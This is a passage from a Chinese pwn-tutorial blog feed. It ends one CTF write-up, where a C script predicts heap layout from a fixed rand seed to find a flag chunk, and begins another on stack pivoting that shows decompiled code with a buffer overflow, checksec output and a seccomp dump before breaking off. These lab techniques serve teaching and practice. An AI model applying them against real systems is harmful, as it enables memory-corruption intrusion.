class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;time.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; SIZE 10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;srand(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v0 = rand();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v1 = v0 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v2 = v1 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v3 = v2 + v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4 = v1 &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v5 = (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)v3 - (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)v4;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;v3 = v5;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;** pre_sprays = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v3 * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;*));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *pre_spray_sizes = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v3 * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; v3; ++i )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v1 = rand();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pre_sprays[i] = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v1 % &lt;span class=&#34;number&#34;&gt;1024&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pre_spray_sizes[i] = malloc_usable_size(pre_sprays[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;i&amp;lt;v3;++i)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d\n&amp;quot;&lt;/span&gt;,pre_spray_sizes[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; *pre_free_sizes = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v3 * &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; ( &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; j &amp;lt; v3; ++j )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v1 = rand();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( ( v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      pre_free_sizes[j] = pre_spray_sizes[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;(pre_sprays[j]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; j=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;j&amp;lt;v3;++j)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index:%d, size:%d\n&amp;quot;&lt;/span&gt;,j,pre_free_sizes[j]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v1 = rand() % &lt;span class=&#34;number&#34;&gt;982&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;42&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* flagaddr = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; flagsize = malloc_usable_size(flagaddr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v1 = rand();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag size:%d\n&amp;quot;&lt;/span&gt;,flagsize);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; tmp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = v3 - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i--) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (pre_free_sizes[i] == flagsize) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d is the index\n&amp;quot;&lt;/span&gt;,i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = tmp - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;; i &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i--) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (pre_free_sizes[i]!= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;index: %d , size: %d &amp;quot;&lt;/span&gt;,i,pre_free_sizes[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		根据这个脚本可以获取flag堆块前面一个空闲堆块的位置和大小,(脚本有待完善,没有判断是第几个,大小貌似也有点问题)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-25-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0%E9%A2%98%E4%B8%80%E9%81%93/image-20230512215715328.png&#34; alt=&#34;image-20230512215715328&#34;&gt;&lt;/p&gt;
&lt;p&gt;还有就是可以同时多开几个不同的大小的,一起尝试&lt;/p&gt;
&lt;h2 id=&#34;技术点总结&#34;&gt;&lt;a href=&#34;#技术点总结&#34; class=&#34;headerlink&#34; title=&#34;技术点总结&#34;&gt;&lt;/a&gt;技术点总结&lt;/h2&gt;&lt;p&gt;1.c语言随机数函数srand、rand的理解&lt;/p&gt;
&lt;p&gt;​		其实这是个伪随机数函数,如果能确定srand的输入,那么随机数的种子就是确定的,rand得到的随机数的值也是确定的.&lt;/p&gt;
&lt;p&gt;2.对堆块布局的理解&lt;/p&gt;
&lt;p&gt;​		在没有bin的情况下,堆的申请在堆内存中是连续的,所以堆块之间都是相邻的,如果想要获取一个堆块的信息,可以通过与它相临的堆块的越界读取来获得.&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-05-12T14:34:02.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/</id>
        <title>pwn入门-24-栈迁移练习题3道</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/"/>
        <content type="html">&lt;h1 id=&#34;1-极客大挑战-2019-Not-Bad&#34;&gt;&lt;a href=&#34;#1-极客大挑战-2019-Not-Bad&#34; class=&#34;headerlink&#34; title=&#34;1.[极客大挑战 2019]Not Bad&#34;&gt;&lt;/a&gt;1.[极客大挑战 2019]Not Bad&lt;/h1&gt;&lt;h2 id=&#34;分析反编译代码及保护&#34;&gt;&lt;a href=&#34;#分析反编译代码及保护&#34; class=&#34;headerlink&#34; title=&#34;分析反编译代码及保护&#34;&gt;&lt;/a&gt;分析反编译代码及保护&lt;/h2&gt;&lt;p&gt;​		Ubuntu 18   2.23libc也就是说理论上&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall main(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; a1, char **a2, char **a3)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mmap((void *)&lt;span class=&#34;number&#34;&gt;0x123000&lt;/span&gt;, 0x1000uLL, &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;34&lt;/span&gt;, -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, 0LL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_400949();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_400906();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  sub_400A16();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; 0LL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; sub_400A16()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char buf[&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;]; // [rsp+0h] [rbp-20h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(&lt;span class=&#34;string&#34;&gt;&amp;quot;Easy shellcode, have fun!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, buf, 0x38uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; puts(&lt;span class=&#34;string&#34;&gt;&amp;quot;Baddd! Focu5 me! Baddd! Baddd!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset); 开始分配了一段空间,不知道干啥用的&lt;/p&gt;
&lt;p&gt;​		然后安装了seccomp,设置io流,读入0x38 &amp;#x3D; 56字节, 减去32 减去8rbp, 16个字节的溢出&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-ubuntu:/home/ubuntu/stackpivot/jikenotbad&lt;span class=&#34;comment&#34;&gt;# checksec bad&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/stackpivot/jikenotbad/bad&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX disabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (&lt;span class=&#34;number&#34;&gt;0x3ff000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RWX:      Has RWX segments&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RUNPATH:  &lt;span class=&#34;string&#34;&gt;b&amp;#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		可以写shellcode, orw读取flag, 写的话,直接是写入到了一开始mmap的地址&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;-ubuntu:/home/ubuntu/stackpivot/jikenotbad&lt;span class=&#34;comment&#34;&gt;# seccomp-tools dump ./bad&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;number&#34;&gt;0000&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000004&lt;/span&gt;  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0001: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x08&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xc000003e&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != ARCH_X86_64) goto &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0002: &lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0003: &lt;span class=&#34;number&#34;&gt;0x35&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x01&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A &amp;lt; &lt;span class=&#34;number&#34;&gt;0x40000000&lt;/span&gt;) goto 0005&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0004: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x05&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A != &lt;span class=&#34;number&#34;&gt;0xffffffff&lt;/span&gt;) goto &lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0005: &lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x03&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (A == read) goto 